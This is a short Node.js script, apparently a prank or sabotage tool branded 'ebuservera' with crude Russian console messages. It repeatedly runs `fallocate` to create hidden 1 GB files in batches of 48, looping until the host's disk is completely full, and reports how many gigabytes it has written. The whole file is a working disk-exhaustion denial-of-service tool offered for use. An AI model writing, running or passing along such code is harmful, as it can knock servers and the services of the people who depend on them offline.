const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');

let megabytes = 0;
let curr = 0;

function allocateSpace() {
    return new Promise((resolve, reject) => {
        const target = `.___tmp_${uuidv4()}`;
        exec(`fallocate -l 1G ${target}`, (error, stdout, stderr) => {
            if (error) {
                console.error("Нету места на хосте, ");
                reject(error);
            } else {
                megabytes += 1;
                curr += 1;
                resolve();
            }
        });
    });
}

function displayStatus() {
    setInterval(() => {
        console.log(`Закачал всего [ ${megabytes} ГБ ] со скоростью [ ${curr} Гб/с ]`);
        curr = 0;
    }, 1000);
}

function uuidv4() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = (Math.random() * 16) | 0;
        const v = c === 'x' ? r : (r & 0x3) | 0x8;
        return v.toString(16);
    });
}

async function main() {
    console.log("ebuservera by fiuimwix");
    console.log("Режим: забивка всей памяти");
    console.log("Подготовка..");

    displayStatus();

    try {
        while (true) {
            const promises = [];
            for (let i = 0; i < 48; i++) {
                promises.push(allocateSpace());
            }
            await Promise.all(promises);
        }
    } catch (error) {
        console.error("Закончил с причиной:", error.message);
    }

    console.log("Начали нахуй!");
}

main();